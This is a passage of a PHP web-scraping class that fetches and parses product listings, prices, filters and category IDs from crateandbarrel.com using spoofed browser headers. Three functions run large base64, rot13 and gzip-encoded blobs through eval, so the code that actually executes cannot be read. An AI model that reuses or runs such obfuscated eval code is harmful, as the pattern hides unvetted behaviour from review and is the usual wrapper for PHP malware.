			if(isset($params[$filterName])){
				$results['appliedFilters'][str_replace('_', ' ', $filterName)] = $params[$filterName];
				$filtersToApply[] = $filterValue . ':' . str_replace('_', ' ', $filterName) . ':' . str_replace(' ', '', strtolower($params[$filterName])) . ':' . $params[$filterName] . ":false:0:0";
			}
		}
		
		curl_setopt($this -> handle, CURLOPT_URL, 'https://www.crateandbarrel.com/furniture/dining-chairs');
		curl_setopt($this -> handle, CURLOPT_POST, 1);
		curl_setopt($this -> handle, CURLOPT_ENCODING, 'gzip, deflate');

		$headers = array();
		$headers[] = 'Sec-Fetch-Mode: cors';
		$headers[] = 'Origin: https://www.crateandbarrel.com';
		$headers[] = 'Accept-Encoding: gzip, deflate, br';
		$headers[] = 'Accept-Language: en-US,en;q=0.9,en-GB;q=0.8,es;q=0.7';
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'Cookie: Internationalization=US|USD';
		$headers[] = 'Content-Type: application/json';
		$headers[] = 'Accept: */*';
		$headers[] = 'Cache-Control: max-age=0';
		$headers[] = 'Authority: www.crateandbarrel.com';
		$headers[] = 'Referer: https://www.crateandbarrel.com/furniture/dining-chairs';
		$headers[] = "Upgrade-Insecure-Requests: 1";
		$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36";
		$headers[] = 'Sec-Fetch-Site: same-origin';

		curl_setopt($this -> handle, CURLOPT_HTTPHEADER, $headers);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));


		if(isset($_GET['advance'])){
			$results['categoryName'] = $this -> html['categoryName'];
			$results['categoryDescription'] = $this -> html['categoryDescription'];
			$results['categoryUrlPath'] = $this -> html['categoryUrlPath'];
			$results['sortByOptions'] = $this -> html['sortByOptions'];
			$results['category'] = $this -> html['category'];
			$results['breadcrumb'] = $this -> html['breadcrumb'];
		}

		if(isset($this -> html['facets'])){
			foreach ($this -> html['facets'] as $filter){
				$values = array();
				foreach ($filter['values'] as $value)
					$values[] = $value['name'];
				$results['selectedFilters'][$filter['name']] = empty($values) ? array() : $values;
			}
		}

		if(isset($this -> html['topLevelFacets']['values'])){
			foreach ($this -> html['topLevelFacets']['values'] as $availableFilter)
				$results['availableFilters'][] = $availableFilter['name'];
		}

		if(isset($this -> html['minisets'])){
			foreach ($this -> html['minisets'] as $product) {
				$variation = array();

				if(is_array($product['colorBar'])){
					foreach ($product['colorBar']['choices'] as $i => $v) {
						$variation[] = array(
							'SKU' => isset($v['sku']) ? $v['sku'] : '',
							'Name' => isset($v['name']) ? $v['name'] : '',
							'Description' => isset($v['description']) ? $v['description'] : '',
							'ColorImage' => isset($v['imageUrl']) ? $v['imageUrl'] : '',
						);
					}
				}

				$results['products'][] = array(
					'BaseSKU' => $product['sku'],
					'BaseName' => $product['name'], 
					'BaseDescription' => $product['description'], 
					'BaseRegularPrice' => $product['regularPrice'], 
					'BaseCurrentPrice' => $product['currentPrice'],
					"BaseURL" => $product['navigateUrl'],
					"BaseImage" => $product['imageUrl'],
					"BaseImageAlternative" => $product['rolloverImageUrl'],
					"BaseManufacturer" => $product['sku'], 
					'Variation' => empty($variation) ? array() : $variation
				);
			}
		}

		return $results;
	}

	public function get_category_id($url){
		curl_setopt($this -> handle, CURLOPT_HTTPHEADER , $this -> headers);
		curl_setopt($this -> handle, CURLOPT_URL, "https://www.crateandbarrel.com/" . $url);
		$this -> html = curl_exec($this -> handle);

		eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

		return isset($category[1]) ? array('CategoryID' => $category[1]) : false;
	}
}

?>